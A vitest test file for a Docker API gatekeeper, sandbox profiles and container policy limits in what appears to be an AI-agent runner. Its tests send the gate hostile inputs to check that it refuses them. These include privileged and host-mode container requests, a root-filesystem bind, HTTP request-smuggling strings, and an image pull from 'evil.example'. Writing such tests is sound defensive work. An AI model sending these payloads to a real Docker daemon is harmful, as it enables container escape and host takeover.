import { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { createServer, request as httpRequest, type Server } from 'node:http';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { DockerGate, LABEL, scopedQuery, startDockerProxy, upgradeBody } from '../src/box/docker-proxy.ts';
import { MACH_NEVER, macDevopsProfile } from '../src/box/macos-profile.ts';
import { recipeBinding, recipeEgress } from '../src/box/recipe-approval.ts';
import { runsGuildwiseServer, T12_WARNING, t12Warning } from '../src/box/t12.ts';
import { beyondCeiling, narrowAccess } from '../src/policy/gate.ts';
import { DEFAULT_POLICY, type Policy, PolicySchema } from '../src/policy/schema.ts';
import { cleanupTmp, tmp } from './helpers.ts';

cleanupTmp();
const servers: Server[] = [];
afterAll(() => {
  for (const s of servers) s.close();
});

const policyOf = (over: Partial<Policy> = {}): Policy =>
  PolicySchema.parse({ ...DEFAULT_POLICY, setupDone: true, allowDocker: true, ...over });
const access = (over = {}) => ({
  allowInstall: false,
  allowDocker: true,
  sudo: true,
  allowedPaths: [] as string[],
  ...over,
});

describe('the local ceiling (D6/D9, D10 defaults)', () => {
  it('defaults: Docker yes, no extra folders, test-container internet no', () => {
    expect(policyOf().ceiling).toEqual({ docker: true, mountRoots: [], containerEgress: false });
  });

  it('the effective box is the server switches intersected with the ceiling; beyond it is named', () => {
    const ok = (p: string, roots: readonly string[]) => roots.some((r) => p === r || p.startsWith(`${r}/`));
    // Docker off in the ceiling: a Desk click cannot give it
    expect(
      narrowAccess(policyOf({ ceiling: { docker: false, mountRoots: [], containerEgress: false } }), access())
        .allowDocker,
    ).toBe(false);
    expect(narrowAccess(policyOf(), access()).allowDocker).toBe(true);
    // no roots (the default): no folder from a Desk click passes, whatever the server sent
    expect(narrowAccess(policyOf(), access({ allowedPaths: ['/srv/app'] }), ok).allowedPaths).toEqual([]);
    const withRoot = policyOf({ ceiling: { docker: true, mountRoots: ['/srv'], containerEgress: false } });
    expect(narrowAccess(withRoot, access({ allowedPaths: ['/srv/app', '/etc'] }), ok).allowedPaths).toEqual([
      '/srv/app',
    ]);
    expect(beyondCeiling(withRoot, access({ allowedPaths: ['/srv/app', '/etc'] }), ok)).toEqual([
      'the folder /etc',
    ]);
    expect(
      beyondCeiling(
        policyOf({ ceiling: { docker: false, mountRoots: [], containerEgress: false } }),
        access(),
      ),
    ).toEqual(['Docker']);
  });
});

describe('D9: the test-services recipe binding', () => {
  const d1 = `sha256:${'a'.repeat(64)}`;
  const d2 = `sha256:${'b'.repeat(64)}`;
  it('no internet with the ceiling off; only the exact approved recipe and digests get it; any change asks again', () => {
    const approved = recipeBinding('services: db', [d1, d2]);
    expect(recipeEgress(false, approved, 'services: db', [d1, d2])).toEqual({
      egress: false,
      reason: 'ceiling',
    });
    expect(recipeEgress(true, undefined, 'services: db', [d1])).toEqual({
      egress: false,
      reason: 'not_approved',
    });
    expect(recipeEgress(true, approved, 'services: db', [d2, d1])).toEqual({ egress: true });
    expect(recipeEgress(true, approved, 'services: db2', [d1, d2]).egress).toBe(false);
    expect(recipeEgress(true, approved, 'services: db', [d1, `sha256:${'c'.repeat(64)}`]).egress).toBe(false);
    // a tag is never a binding
    expect(() => recipeBinding('x', ['postgres:16'])).toThrow(/digest/);
    expect(recipeEgress(true, approved, 'services: db', ['postgres:16'])).toEqual({
      egress: false,
      reason: 'changed',
    });
  });
});

describe('T12: the shared daemon warning', () => {
  it('warns when the daemon also runs a Guildwise server stack', () => {
    expect(runsGuildwiseServer([{ image: 'guildwise-cloud-video-worker:1.10.0', labels: {} }])).toBe(true);
    expect(
      runsGuildwiseServer([{ image: 'postgres:16', labels: { 'com.docker.compose.project': 'aom-uat' } }]),
    ).toBe(true);
    expect(
      runsGuildwiseServer([{ image: 'postgres:16', labels: { 'com.docker.compose.project': 'shop' } }]),
    ).toBe(false);
    const ps = (lines: object[]) => () => ({
      status: 0,
      stdout: lines.map((l) => JSON.stringify(l)).join('\n'),
    });
    expect(t12Warning({}, ps([{ Image: 'redis', Labels: 'com.docker.compose.project=aom-uat,x=y' }]))).toBe(
      T12_WARNING,
    );
    expect(t12Warning({}, ps([{ Image: 'redis', Labels: '' }]))).toBeNull();
    expect(t12Warning({}, () => ({ status: 1, stdout: '' }))).toBeNull();
  });
});

describe('S5: the macOS DevOps profiles (generated text only: no Mac here, Mac QA required)', () => {
  it('deny default, only the plan paths, no launchd, LaunchServices, AppleEvents or keychain, no LaunchAgents writes', () => {
    for (const level of ['inner', 'outer'] as const) {
      const sb = macDevopsProfile({
        level,
        home: '/Users/o',
        readPaths: ['/Users/o/code/toy'],
        writePaths: ['/Users/o/.aom/agents/a/devops/r1'],
        proxyPort: 3128,
      });
      expect(sb).toContain('(deny default)');
      for (const n of MACH_NEVER) expect(sb).not.toContain(`"${n}"`);
      expect(sb).toContain('(deny file-write* (subpath "/Users/o/Library/LaunchAgents"))');
      expect(sb).toContain('(subpath "/Users/o/.claude")');
      expect(sb).toContain('localhost:3128');
      expect(sb.includes('"/Users/o/.ssh"')).toBe(level === 'outer');
      // Docker Desktop's own socket is never allowed; only the gatekeeper's when given
      expect(sb).not.toContain('/.docker/run/docker.sock');
      expect(
        macDevopsProfile({
          level,
          home: '/Users/o',
          readPaths: [],
          writePaths: [],
          proxyPort: 1,
          dockerSocket: '/t/g.sock',
        }),
      ).toContain('(allow network-outbound (literal "/t/g.sock"))');
    }
  });
});

describe('R4-B2: the Docker gatekeeper', () => {
  const env = () => {
    const root = realpathSync(tmp('aom-dk-'));
    const scratch = join(root, 'agents', 'a', 'devops', 'r1');
    mkdirSync(join(scratch, 'sub'), { recursive: true });
    const gate = new DockerGate({ instance: 'inst-1', bindRoots: [scratch], containerEgress: false });
    gate.networks.add('gw-net');
    return { root, scratch, gate };
  };

  it('canonical create: unknown or case-variant keys, privileged, host modes and odd mounts are refused', () => {
    const { gate, scratch } = env();
    const ok = gate.createContainer({
      Image: 'postgres:16',
      HostConfig: { Binds: [`${scratch}:/w`], NetworkMode: 'gw-net' },
    });
    expect(ok.ok).toBe(true);
    if (ok.ok) expect((ok.body as { Labels: Record<string, string> }).Labels[LABEL]).toBe('inst-1');
    for (const bad of [
      { Image: 'x', HostConfig: { Privileged: true } },
      { Image: 'x', HostConfig: { privileged: true } },
      { Image: 'x', HostConfig: { CapAdd: ['SYS_ADMIN'] } },
      { Image: 'x', HostConfig: { NetworkMode: 'host' } },
      { Image: 'x', HostConfig: { NetworkMode: 'container:abc' } },
      { Image: 'x', HostConfig: { PidMode: 'host' } },
      { Image: 'x', HostConfig: { Devices: [{ PathOnHost: '/dev/kvm' }] } },
      { Image: 'x', HostConfig: { Links: ['a:b'] } },
      { Image: 'x', HostConfig: { VolumesFrom: ['a'] } },
      { Image: 'x', HostConfig: { SecurityOpt: ['seccomp=unconfined'] } },
      { Image: 'x', HostConfig: { Mounts: [{ Type: 'npipe', Source: '/x', Target: '/y' }] } },
      {
        Image: 'x',
        HostConfig: {
          Mounts: [
            { Type: 'volume', Source: 'v', Target: '/y', VolumeOptions: { DriverConfig: { Name: 'local' } } },
          ],
        },
      },
      { Image: 'x', HostConfig: { PortBindings: { '5432/tcp': [{ HostIp: '0.0.0.0', HostPort: '5432' }] } } },
      { Image: 'x', image: 'y' },
      { Image: 'x', HostConfig: { Binds: [`${scratch}/sub:/w`] } },
      { Image: 'x', HostConfig: { Binds: ['/:/host'] } },
      { Image: 'x', NetworkingConfig: { EndpointsConfig: { bridge: {} } } },
    ])
      expect(gate.createContainer(bad).ok, JSON.stringify(bad)).toBe(false);
  });

  it('a bind root swapped for a link to elsewhere is refused (the daemon resolves paths itself)', () => {
    const { gate, root } = env();
    const g2 = new DockerGate({ instance: 'i', bindRoots: [join(root, 'link')], containerEgress: false });
    symlinkSync('/etc', join(root, 'link'));
    expect(g2.createContainer({ Image: 'x', HostConfig: { Binds: [`${join(root, 'link')}:/w`] } }).ok).toBe(
      false,
    );
    expect(gate.createContainer({ Image: 'x', HostConfig: { Binds: ['/etc:/w'] } }).ok).toBe(false);
  });

  it('networks are internal (no internet) unless the ceiling allows it; routes outside the list are refused', () => {
    const { gate } = env();
    const n = gate.createNetwork({ Name: 'tests', Internal: false });
    expect(n.ok && (n.body as { Internal: boolean }).Internal).toBe(true);
    const open = new DockerGate({ instance: 'i', bindRoots: [], containerEgress: true }).createNetwork({
      Name: 't',
      Internal: false,
    });
    expect(open.ok && (open.body as { Internal: boolean }).Internal).toBe(false);
    expect(gate.createNetwork({ Name: 't', Driver: 'macvlan' }).ok).toBe(false);
    expect(gate.createVolume({ Name: 'v', DriverOpts: { device: '/' } }).ok).toBe(false);
    expect(gate.classify('POST', '/v1.24/containers/create').kind).toBe('refuse');
    expect(gate.classify('POST', '/v1.45/build').kind).toBe('refuse');
    expect(gate.classify('GET', '/v1.45/info').kind).toBe('refuse');
    expect(gate.classify('POST', '/v1.45/swarm/init').kind).toBe('refuse');
    // BuildKit is not available through the gatekeeper (REVIEW nit: `docker build` does not work in the outer box)
    expect(gate.classify('POST', '/v1.45/session').kind).toBe('refuse');
    expect(scopedQuery('/containers/json?all=1', 'i')).toContain(encodeURIComponent(`${LABEL}=i`));
  });

  it('end to end against a fake daemon: lists are scoped, another stack’s container is out of reach, bodies are re-serialised', async () => {
    const seen: Array<{ method: string; url: string; body: string }> = [];
    const dir = mkdtempSync(join(tmpdir(), 'aom-dkp-'));
    const upstream = join(dir, 'docker.sock');
    const fake = createServer((req, res) => {
      let b = '';
      req.on('data', (c) => (b += c));
      req.on('end', () => {
        seen.push({ method: req.method ?? '', url: req.url ?? '', body: b });
        res.setHeader('content-type', 'application/json');
        if (req.url?.startsWith('/containers/mine/json'))
          return res.end(JSON.stringify({ Config: { Labels: { [LABEL]: 'inst-1' } } }));
        if (req.url?.startsWith('/containers/uat-db/json'))
          return res.end(JSON.stringify({ Config: { Labels: { 'com.docker.compose.project': 'aom-uat' } } }));
        if (req.method === 'GET' && req.url?.startsWith('/networks/')) {
          res.statusCode = 404;
          return res.end('{}');
        }
        if (req.url === '/networks/create') {
          res.statusCode = 201;
          return res.end(JSON.stringify({ Id: 'net-id-1' }));
        }
        res.end('{}');
      });
    });
    servers.push(fake);
    await new Promise<void>((r) => fake.listen(upstream, () => r()));
    const socketPath = join(dir, 'gate.sock');
    const proxy = await startDockerProxy({
      socketPath,
      upstream,
      policy: { instance: 'inst-1', bindRoots: [], containerEgress: false },
    });
    const call = (method: string, path: string, body?: string, headers: Record<string, string> = {}) =>
      new Promise<number>((resolve) => {
        const req = httpRequest(
          { socketPath, path, method, headers: { 'content-type': 'application/json', ...headers } },
          (res) => {
            res.resume();
            resolve(res.statusCode ?? 0);
          },
        );
        req.on('error', () => resolve(0));
        req.end(body);
      });
    expect(await call('GET', '/v1.45/containers/json?all=1')).toBe(200);
    expect(seen.at(-1)?.url).toContain(encodeURIComponent(`${LABEL}=inst-1`));
    expect(await call('POST', '/v1.45/containers/mine/stop')).toBe(200);
    expect(await call('POST', '/v1.45/containers/uat-db/stop')).toBe(404);
    expect(seen.some((s) => s.url.includes('uat-db/stop'))).toBe(false);
    expect(
      await call('POST', '/v1.45/containers/create', '{"Image":"redis","HostConfig":{"Privileged":true}}'),
    ).toBe(403);
    expect(await call('POST', '/v1.45/containers/create', '{"Image":"redis",   "Labels":{"a":"b"}}')).toBe(
      200,
    );
    expect(seen.at(-1)?.body).toBe(
      JSON.stringify({
        Image: 'redis',
        Labels: { a: 'b', [LABEL]: 'inst-1' },
        // no network named: the gatekeeper's own internal network (made first), never the default bridge
        HostConfig: { NetworkMode: proxy.gate.defaultNetworkName },
      }),
    );
    expect(
      await call('POST', '/v1.45/containers/create', '{"Image":"redis"}', {
        'transfer-encoding': 'chunked',
        'content-length': '18',
      }),
    ).not.toBe(200);
    await proxy.close();
  });
});

describe('the local page sets the ceiling (only there; nothing filled in from a link)', () => {
  it('a never-list root is refused; a plain folder is kept by its real path', async () => {
    const { applyChange } = await import('../src/window/api.ts');
    const { PolicyStore } = await import('../src/policy/store.ts');
    const { homedir } = await import('node:os');
    const dir = tmp('aom-ceil-');
    const store = new PolicyStore(dir);
    store.write({ ...store.get(), setupDone: true });
    const ctx = {
      deps: { policy: store, log: { info() {}, warn() {}, error() {} } },
      dir,
      cli: 'guildwise-runner',
      port: 1,
      instanceName: 'prod',
      now: Date.now,
    } as never;
    const set = (mountRoots: string[]) =>
      applyChange(ctx, 'dev', { action: 'ceiling.set', docker: false, containerEgress: false, mountRoots });
    expect((await set([homedir()])).status).toBe(400);
    expect((await set([dir])).status).toBe(400); // the policy dir itself
    const plain = realpathSync(tmp('aom-plain-'));
    symlinkSync(plain, join(tmp('aom-l-'), 'l'));
    expect((await set([plain])).status).toBe(200);
    expect(store.get().ceiling).toEqual({ docker: false, containerEgress: false, mountRoots: [plain] });
    expect(
      (
        await applyChange(ctx, 'dev', {
          action: 'ceiling.set',
          docker: true,
          containerEgress: true,
          mountRoots: [],
          extra: 1,
        })
      ).status,
    ).toBe(403);
  });
});

describe('S6: the port bridge', () => {
  it('pinned by digest, listed ports only, on 127.0.0.1, no capabilities, ip_forward 0', async () => {
    const { bridgeContainer } = await import('../src/box/port-bridge.ts');
    const img = `node@sha256:${'d'.repeat(64)}`;
    const b = bridgeContainer({
      instance: 'i',
      name: 'br',
      image: img,
      internalNetwork: 'gw-int',
      ports: [{ hostPort: 18931, service: 'db', servicePort: 5432 }],
    }) as { HostConfig: Record<string, unknown>; Cmd: string[] };
    expect(b.HostConfig.PortBindings).toEqual({ '9000/tcp': [{ HostIp: '127.0.0.1', HostPort: '18931' }] });
    expect(b.HostConfig.CapDrop).toEqual(['ALL']);
    expect(b.HostConfig.Sysctls).toEqual({ 'net.ipv4.ip_forward': '0' });
    expect(b.Cmd.join(' ')).toContain('"db",5432');
    expect(() =>
      bridgeContainer({ instance: 'i', name: 'b', image: 'node:22', internalNetwork: 'n', ports: [] }),
    ).toThrow();
    expect(() =>
      bridgeContainer({
        instance: 'i',
        name: 'b',
        image: img,
        internalNetwork: 'n',
        ports: [{ hostPort: 22, service: 'x', servicePort: 1 }],
      }),
    ).toThrow();
  });
});

describe('S5 wiring: the macOS box command (unit only: no Mac here)', () => {
  it('sandbox-exec with the level profile, the proxy variables, and a missing sandbox-exec holds the work', async () => {
    const { macBoxCommand, macBoxMissing, SANDBOX_EXEC, startTcpBridge } = await import(
      '../src/box/macos-launch.ts'
    );
    const c = macBoxCommand(
      '/t/devops-inner.sb',
      { bin: '/c/claude', args: ['-p', 'x'], env: { A: '1' } },
      4555,
    );
    expect(c.bin).toBe(SANDBOX_EXEC);
    expect(c.args).toEqual(['-f', '/t/devops-inner.sb', '/c/claude', '-p', 'x']);
    expect(c.env.HTTPS_PROXY).toBe('http://127.0.0.1:4555');
    expect(macBoxMissing(() => false)).toMatch(/sandbox-exec/);
    expect(macBoxMissing(() => true)).toBeNull();
    // the runner-side loopback bridge to the proxy socket
    const dir = mkdtempSync(join(tmpdir(), 'aom-br-'));
    const sock = join(dir, 's.sock');
    const echo = createServer((q, s) => s.end(`via ${q.url}`));
    servers.push(echo);
    await new Promise<void>((r) => echo.listen(sock, () => r()));
    const b = await startTcpBridge(sock);
    const body = await (await fetch(`http://127.0.0.1:${b.port}/hello`)).text();
    await b.close();
    expect(body).toBe('via /hello');
  });
});

describe('S6/D9: test services from a recipe', () => {
  const dg = (c: string) => `sha256:${c.repeat(64)}`;
  const recipeText = JSON.stringify({
    services: [{ name: 'db', image: `postgres@${dg('a')}`, port: 5432, hostPort: 25432 }],
    egress: true,
  });

  it('parses only digest-pinned images and sane ports', async () => {
    const { parseRecipe } = await import('../src/box/test-services.ts');
    expect(parseRecipe(recipeText).services[0]?.name).toBe('db');
    for (const bad of [
      { services: [{ name: 'db', image: 'postgres:16', port: 5432, hostPort: 25432 }] },
      { services: [{ name: 'DB!', image: `postgres@${dg('a')}`, port: 5432, hostPort: 25432 }] },
      { services: [{ name: 'db', image: `postgres@${dg('a')}`, port: 5432, hostPort: 22 }] },
      { services: [] },
    ])
      expect(() => parseRecipe(JSON.stringify(bad))).toThrow();
  });

  it('internal network unless the ceiling allows it and exactly this recipe was approved', async () => {
    const { parseRecipe, planTestServices, RecipeApprovals, recipeDigests } = await import(
      '../src/box/test-services.ts'
    );
    const { ensurePolicyKey } = await import('../src/policy/integrity.ts');
    const r = parseRecipe(recipeText);
    const base = {
      instance: 'abcdef0123456789',
      projectKey: 'TOY',
      recipe: r,
      recipeText,
      bridgeImage: `node@${dg('d')}`,
    };
    expect(planTestServices({ ...base, ceilingEgress: false }).network.Internal).toBe(true);
    expect(planTestServices({ ...base, ceilingEgress: true }).network.Internal).toBe(true);
    const pdir = tmp('aom-ra-');
    ensurePolicyKey(pdir);
    const store = new RecipeApprovals(pdir);
    store.approve('p1', recipeText, recipeDigests(r));
    const ok = planTestServices({ ...base, ceilingEgress: true, approved: store.get('p1') });
    expect(ok.network.Internal).toBe(false);
    expect(ok.egress).toBe(true);
    // a changed recipe needs a new click
    const changed = recipeText.replace('25432', '25433');
    expect(
      planTestServices({
        ...base,
        recipe: parseRecipe(changed),
        recipeText: changed,
        ceilingEgress: true,
        approved: store.get('p1'),
      }).network.Internal,
    ).toBe(true);
    // services publish nothing; only the bridge does, on 127.0.0.1
    expect(ok.services[0]?.body.HostConfig).toMatchObject({ NetworkMode: ok.network.Name });
    expect(JSON.stringify(ok.services)).not.toContain('PortBindings');
    expect(ok.testServices).toEqual(['127.0.0.1:25432']);
  });

  it('runs the plan on the daemon: network, services, bridge joined to the default network, started', async () => {
    const { parseRecipe, planTestServices, runTestServices } = await import('../src/box/test-services.ts');
    const calls: string[] = [];
    const dir = mkdtempSync(join(tmpdir(), 'aom-ts-'));
    const sock = join(dir, 'd.sock');
    const fake = createServer((q, s) => {
      q.resume();
      q.on('end', () => {
        calls.push(`${q.method} ${q.url?.replace(/^\/v1\.43/, '')}`);
        s.statusCode = q.method === 'DELETE' ? 404 : 201;
        s.end('{}');
      });
    });
    servers.push(fake);
    await new Promise<void>((r) => fake.listen(sock, () => r()));
    const plan = planTestServices({
      instance: 'abcdef0123456789',
      projectKey: 'TOY',
      recipe: parseRecipe(recipeText),
      recipeText,
      bridgeImage: `node@${dg('d')}`,
      ceilingEgress: false,
    });
    expect(await runTestServices(sock, plan)).toEqual(['127.0.0.1:25432']);
    const made = calls.filter((c) => !c.startsWith('DELETE'));
    expect(made[0]).toBe('POST /networks/create');
    expect(made).toContain(`POST /networks/bridge/connect`);
    expect(made.filter((c) => c.endsWith('/start'))).toHaveLength(2);
  });
});

describe('the gatekeeper in front of a real daemon on this computer (skipped without one)', () => {
  const real = [
    '/run/docker-svc/docker.sock',
    `/run/user/${process.getuid?.()}/docker.sock`,
    '/var/run/docker.sock',
  ].find((p) => {
    try {
      return (
        require('node:fs').statSync(p).isSocket() &&
        require('node:child_process').spawnSync('docker', ['-H', `unix://${p}`, 'version'], {
          stdio: 'ignore',
        }).status === 0
      );
    } catch {
      return false;
    }
  });
  it.skipIf(!real)(
    'answers a ping, and lists none of the other stacks’ containers (label scope)',
    async () => {
      const dir = mkdtempSync(join(tmpdir(), 'aom-dkr-'));
      const socketPath = join(dir, 'g.sock');
      const proxy = await startDockerProxy({
        socketPath,
        upstream: real as string,
        policy: { instance: `qa-${Date.now()}`, bindRoots: [], containerEgress: false },
      });
      const get = (path: string) =>
        new Promise<{ status: number; body: string }>((resolve) => {
          httpRequest({ socketPath, path, method: 'GET', headers: { host: 'docker' } }, (res) => {
            let b = '';
            res.on('data', (c) => (b += c));
            res.on('end', () => resolve({ status: res.statusCode ?? 0, body: b }));
          }).end();
        });
      expect((await get('/v1.43/_ping')).body).toBe('OK');
      const list = await get('/v1.43/containers/json?all=1');
      expect(list.status).toBe(200);
      expect(JSON.parse(list.body)).toEqual([]);
      expect((await get('/v1.43/info')).status).toBe(403);
      await proxy.close();
    },
  );
});

describe('Rework 1 (REVIEW B1): the gatekeeper holes, one test each', () => {
  /** A fake daemon that keeps connections alive and answers like Docker; records every request line it parses. */
  async function daemon(o: { labelled?: string[]; volumes?: string[]; failNetworkCreate?: boolean } = {}) {
    const seen: Array<{ method: string; url: string; body: string }> = [];
    const dir = mkdtempSync(join(tmpdir(), 'aom-dkb-'));
    const upstream = join(dir, 'docker.sock');
    const mine = new Set(o.labelled ?? ['mine']);
    const vols = new Set(o.volumes ?? ['gw-vol']);
    const fake = createServer((req, res) => {
      let b = '';
      req.on('data', (c) => (b += c));
      req.on('end', () => {
        seen.push({ method: req.method ?? '', url: req.url ?? '', body: b });
        res.setHeader('content-type', 'application/json');
        const u = (req.url ?? '').replace(/^\/v1\.\d+/, '');
        let m = /^\/containers\/([^/]+)\/json/.exec(u);
        if (m)
          return res.end(
            JSON.stringify({ Config: { Labels: mine.has(m[1] as string) ? { [LABEL]: 'i' } : {} } }),
          );
        m = /^\/volumes\/([^/]+)$/.exec(u);
        if (m && req.method === 'GET')
          return res.end(
            JSON.stringify({ Labels: vols.has(m[1] as string) ? { [LABEL]: 'i' } : { other: '1' } }),
          );
        m = /^\/exec\/([^/]+)\/json/.exec(u);
        if (m) return res.end(JSON.stringify({ ContainerID: 'mine' }));
        if (/^\/exec\/[^/]+\/start/.test(u)) {
          // a malformed body: Docker answers 400 and keeps the connection alive
          res.statusCode = 400;
          return res.end('{"message":"bad"}');
        }
        if (req.method === 'GET' && /^\/networks\/(host|bridge)$/.test(u)) return res.end('{"Name":"host"}');
        if (req.method === 'GET' && u === '/networks/gwnet')
          return res.end(JSON.stringify({ Labels: { [LABEL]: 'i' } }));
        if (req.method === 'GET' && u.startsWith('/networks/')) {
          res.statusCode = 404;
          return res.end('{}');
        }
        if (u === '/networks/create') {
          res.statusCode = o.failNetworkCreate ? 400 : 201;
          return res.end(o.failNetworkCreate ? '{"message":"no"}' : '{"Id":"n1"}');
        }
        res.end('{}');
      });
    });
    servers.push(fake);
    await new Promise<void>((r) => fake.listen(upstream, () => r()));
    const socketPath = join(dir, 'gate.sock');
    const card = realpathSync(tmp('aom-card-'));
    const proxy = await startDockerProxy({
      socketPath,
      upstream,
      policy: { instance: 'i', bindRoots: [], roBindRoots: [card], containerEgress: false },
    });
    const call = (method: string, path: string, body?: unknown) =>
      new Promise<number>((resolve) => {
        const data = body === undefined ? undefined : JSON.stringify(body);
        const req = httpRequest(
          { socketPath, path, method, headers: { 'content-type': 'application/json' } },
          (res) => {
            res.resume();
            resolve(res.statusCode ?? 0);
          },
        );
        req.on('error', () => resolve(0));
        req.end(data);
      });
    return { seen, call, proxy, socketPath, card };
  }

  it('(d) an exec start the daemon refuses is never followed by smuggled bytes', async () => {
    const d = await daemon();
    const { connect } = await import('node:net');
    const sock = connect(d.socketPath);
    await new Promise<void>((r) => sock.on('connect', () => r()));
    const smuggled =
      'POST /v1.45/containers/create HTTP/1.1\r\nHost: d\r\nContent-Type: application/json\r\nContent-Length: 63\r\n\r\n{"Image":"x","HostConfig":{"Privileged":true,"Binds":["/:/h"]}}';
    let got = '';
    sock.on('data', (c) => (got += c));
    sock.write(
      'POST /v1.45/exec/abc/start HTTP/1.1\r\nHost: d\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Type: application/json\r\nContent-Length: 3\r\n\r\n{x}',
    );
    await new Promise((r) => setTimeout(r, 300));
    sock.write(smuggled);
    await new Promise((r) => setTimeout(r, 800));
    sock.destroy();
    expect(got).toContain('400');
    expect(d.seen.some((s) => s.url.includes('containers/create'))).toBe(false);
    await d.proxy.close();
  });

  it('Rework 2 (REVIEW B1): exec start and containers/create in ONE write: the daemon never sees the create', async () => {
    const d = await daemon();
    const { connect } = await import('node:net');
    const create =
      'POST /v1.45/containers/create HTTP/1.1\r\nHost: d\r\nContent-Type: application/json\r\nContent-Length: 63\r\n\r\n{"Image":"x","HostConfig":{"Privileged":true,"Binds":["/:/h"]}}';
    const oneWrite = async (startBody: string, extraHeaders = '') => {
      const sock = connect(d.socketPath);
      await new Promise<void>((r) => sock.on('connect', () => r()));
      let got = '';
      sock.on('data', (c) => (got += c));
      sock.on('error', () => {});
      sock.write(
        `POST /v1.45/exec/abc/start HTTP/1.1\r\nHost: d\r\nConnection: Upgrade, keep-alive\r\nUpgrade: tcp\r\n${extraHeaders}` +
          `Content-Type: application/json\r\nContent-Length: ${Buffer.byteLength(startBody)}\r\n\r\n${startBody}${create}`,
      );
      await new Promise((r) => setTimeout(r, 800));
      sock.destroy();
      return got;
    };
    // a well-formed body: the daemon answers 400 (keep-alive); the bytes after the body were held back, never sent
    expect(await oneWrite('{"Detach":false,"Tty":false}')).toContain('400');
    const starts = d.seen.filter((s) => s.url.includes('/exec/abc/start'));
    expect(starts).toHaveLength(1);
    expect(starts[0]?.body).toBe('{"Detach":false,"Tty":false}');
    // a malformed body and a chunked upgrade are refused by the gate itself
    expect(await oneWrite('{x}')).toContain('400 Bad Request');
    expect(await oneWrite('{"Detach":false}', 'Transfer-Encoding: chunked\r\n')).toContain('400 Bad Request');
    // a body key outside the allowlist is refused, not relayed
    expect(await oneWrite('{"Detach":false,"Privileged":true}')).toContain('400 Bad Request');
    expect(d.seen.filter((s) => s.url.includes('/exec/abc/start'))).toHaveLength(1);
    expect(d.seen.some((s) => s.url.includes('containers/create'))).toBe(false);
    await d.proxy.close();
  });

  it('Rework 2 (REVIEW B1): the upgrade body allowlist', () => {
    expect(upgradeBody(Buffer.from(''))).toBe('');
    expect(upgradeBody(Buffer.from('{"Detach":true,"Tty":true,"ConsoleSize":[24,80]}'))).toBe(
      '{"Detach":true,"Tty":true,"ConsoleSize":[24,80]}',
    );
    expect(upgradeBody(Buffer.from('{"Tty":"yes"}'))).toBeUndefined();
    expect(upgradeBody(Buffer.from('{"Env":["A=1"]}'))).toBeUndefined();
    expect(upgradeBody(Buffer.from('[1]'))).toBeUndefined();
  });

  it('network names: predefined and existing names refused; a failed create is not remembered', async () => {
    const d = await daemon({ failNetworkCreate: true });
    expect(await d.call('POST', '/v1.45/networks/create', { Name: 'host' })).toBe(403);
    expect(await d.call('POST', '/v1.45/networks/create', { Name: 'bridge' })).toBe(403);
    expect(await d.call('POST', '/v1.45/networks/create', { Name: 'mynet' })).toBe(400);
    expect(d.proxy.gate.networks.has('mynet')).toBe(false);
    expect(
      await d.call('POST', '/v1.45/containers/create', { Image: 'x', HostConfig: { NetworkMode: 'mynet' } }),
    ).toBe(403);
    expect(
      await d.call('POST', '/v1.45/containers/create', { Image: 'x', HostConfig: { NetworkMode: 'host' } }),
    ).toBe(403);
    await d.proxy.close();
    const ok = await daemon();
    expect(await ok.call('POST', '/v1.45/networks/create', { Name: 'mynet' })).toBe(201);
    expect(ok.proxy.gate.networks.has('mynet') && ok.proxy.gate.networks.has('n1')).toBe(true);
    await ok.proxy.close();
  });

  it('a container without a network mode goes on the gate’s internal network, never the default bridge', async () => {
    const d = await daemon();
    expect(await d.call('POST', '/v1.45/containers/create', { Image: 'x' })).toBe(200);
    const made = d.seen.find((s) => s.url.endsWith('/networks/create'));
    expect(JSON.parse(made?.body ?? '{}')).toMatchObject({ Internal: true, Labels: { [LABEL]: 'i' } });
    const created = d.seen.find((s) => s.url.endsWith('/containers/create'));
    expect(JSON.parse(created?.body ?? '{}').HostConfig.NetworkMode).toBe(d.proxy.gate.defaultNetworkName);
    await d.proxy.close();
  });

  it('network connect and disconnect check the target container', async () => {
    const d = await daemon();
    await d.call('POST', '/v1.45/networks/create', { Name: 'mynet' });
    // the network label check: a fake labelled network
    const g = d.proxy.gate;
    expect(g.networks.has('mynet')).toBe(true);
    expect(g.networkConnect({ Container: 'aom-uat-postgres-1' }).ok).toBe(true);
    expect(g.networkConnect({ Container: 'x', Privileged: true }).ok).toBe(false);
    // through the server: an unlabelled container is refused (404), whatever the network
    expect(await d.call('POST', '/v1.45/networks/gwnet/connect', { Container: 'aom-uat-postgres-1' })).toBe(
      404,
    );
    expect(
      await d.call('POST', '/v1.45/networks/gwnet/disconnect', { Container: 'aom-uat-postgres-1' }),
    ).toBe(404);
    expect(d.seen.some((s) => s.url.includes('/connect') || s.url.includes('/disconnect'))).toBe(false);
    expect(await d.call('POST', '/v1.45/networks/gwnet/connect', { Container: 'mine' })).toBe(200);
    await d.proxy.close();
  });

  it('a volume mount uses only the gate’s own labelled volumes; an anonymous one is fine', async () => {
    const d = await daemon({ volumes: ['gw-vol'] });
    const mount = (Source?: string) => ({
      Image: 'x',
      HostConfig: {
        NetworkMode: 'none',
        Mounts: [{ Type: 'volume', Target: '/d', ...(Source ? { Source } : {}) }],
      },
    });
    expect(await d.call('POST', '/v1.45/containers/create', mount('aom-uat_pgdata'))).toBe(403);
    expect(await d.call('POST', '/v1.45/containers/create', mount('gw-vol'))).toBe(200);
    expect(await d.call('POST', '/v1.45/containers/create', mount())).toBe(200);
    await d.proxy.close();
  });

  it('exec create has a body allowlist: no Privileged, no User', async () => {
    const d = await daemon();
    expect(await d.call('POST', '/v1.45/containers/mine/exec', { Cmd: ['id'], Privileged: true })).toBe(403);
    expect(await d.call('POST', '/v1.45/containers/mine/exec', { Cmd: ['id'], User: 'root' })).toBe(403);
    expect(await d.call('POST', '/v1.45/containers/other/exec', { Cmd: ['id'] })).toBe(404);
    expect(await d.call('POST', '/v1.45/containers/mine/exec', { Cmd: ['id'], AttachStdout: true })).toBe(
      200,
    );
    await d.proxy.close();
  });

  it('REVIEW S5: image pulls by name only (no fromSrc URL fetch); a card worktree is bound read-only', async () => {
    const d = await daemon();
    expect(await d.call('POST', '/v1.45/images/create?fromSrc=http://evil.example/x.tar')).toBe(403);
    expect(await d.call('POST', '/v1.45/images/create?fromImage=postgres&tag=16')).toBe(200);
    expect(
